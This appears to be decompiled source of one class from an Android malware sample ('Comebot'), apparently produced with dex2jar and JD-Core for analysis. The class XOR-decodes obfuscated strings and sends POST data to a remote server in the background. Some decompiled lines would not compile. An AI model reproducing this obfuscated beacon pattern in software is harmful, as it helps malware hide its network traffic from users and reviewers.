package anu_bispro.app;

import android.os.AsyncTask;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class b {
  public static String a(String paramString) {
    int i = paramString.length();
    char[] arrayOfChar = new char[i];
    int j = i - 1;
    i = j;
    while (j >= 0) {
      j = paramString.charAt(i);
      int k = i - 1;
      arrayOfChar[i] = (char)(char)(j ^ 0x3B);
      if (k >= 0) {
        j = k - 1;
        arrayOfChar[k] = (char)(char)(paramString.charAt(k) ^ 0x26);
        i = j;
      } 
    } 
    return new String(arrayOfChar);
  }
  
  public String a(String paramString1, String paramString2) {
    String str;
    a a = new a();
    a a1 = new a(this);
    a1.execute((Object[])new String[] { paramString1, paramString2 });
    try {
      paramString1 = a.a((String)a1.get(), a("\007RZA\005"), c.a("Z\"\022l\0013"));
    } catch (Exception exception) {
      str = "";
    } 
    return str;
  }
  
  class a extends AsyncTask<String, String, String> {
    String a = null;
    
    a(b this$0) {}
    
    protected String a(String... param1VarArgs) {
      String str2 = param1VarArgs[0];
      String str1 = param1VarArgs[1];
      try {
        URL uRL = new URL();
        this(str2);
        HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
        httpURLConnection.setRequestMethod(c.a("6B5Y"));
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        String str = c.a("%b\by\003c\022 *h\bj\022e");
        StringBuilder stringBuilder = new StringBuilder();
        this();
        httpURLConnection.setRequestProperty(str, stringBuilder.insert(0, "").append(Integer.toString((str1.getBytes()).length)).toString());
        httpURLConnection.getOutputStream().write(str1.getBytes(c.a("X2KK5")));
        httpURLConnection.connect();
        int i = httpURLConnection.getResponseCode();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        this();
        if (i == 200) {
          InputStream inputStream = httpURLConnection.getInputStream();
          byte[] arrayOfByte = new byte[8192];
          while (true) {
            i = inputStream.read(arrayOfByte);
            if (i != -1) {
              byteArrayOutputStream.write(arrayOfByte, 0, i);
              continue;
            } 
            arrayOfByte = byteArrayOutputStream.toByteArray();
            String str3 = new String();
            this(arrayOfByte, c.a("X2KK5"));
            this.a = str3;
            break;
          } 
        } 
      } catch (MalformedURLException malformedURLException) {
      
      } catch (IOException iOException) {
      
      } catch (Exception exception) {}
      return this.a;
    }
    
    protected void a(String param1String) {
      super.onPostExecute(param1String);
    }
    
    protected void onPreExecute() {
      super.onPreExecute();
    }
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */